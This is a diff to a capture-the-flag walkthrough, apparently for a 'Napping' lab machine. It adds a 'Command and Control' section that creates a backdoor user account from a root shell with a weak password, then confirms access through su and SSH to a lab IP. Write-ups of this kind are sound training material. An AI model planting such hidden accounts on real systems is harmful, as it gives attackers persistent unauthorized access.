@@ -154,3 +154,20 @@
 1. Open the root flag file  
     * Input the following commands  
     ![Root-txt](./img/napping-101_server23.png)    
+
+## Command and Control
+1. Add a new user as a "backdoor" in the root shell  
+    * `useradd backdoor`  
+    * `passwd backdoor`  
+    ![backdoor](./img/napping-101_server24.png)  
+
+1. Login confirmation from user's(daniel) account  
+    * `su backdoor`  
+    * Input "passw0rd" as the backdoor's password  
+    ![backdoor-login](./img/napping-101_server25.png)  
+
+1. SSH access confirmation  
+    * `ssh backdoor@192.168.56.106`  
+    ![backdoor-ssh](./img/napping-101_server26.png)    
+        - Root prompt is shown  
+        - Password: `passw0rd`  
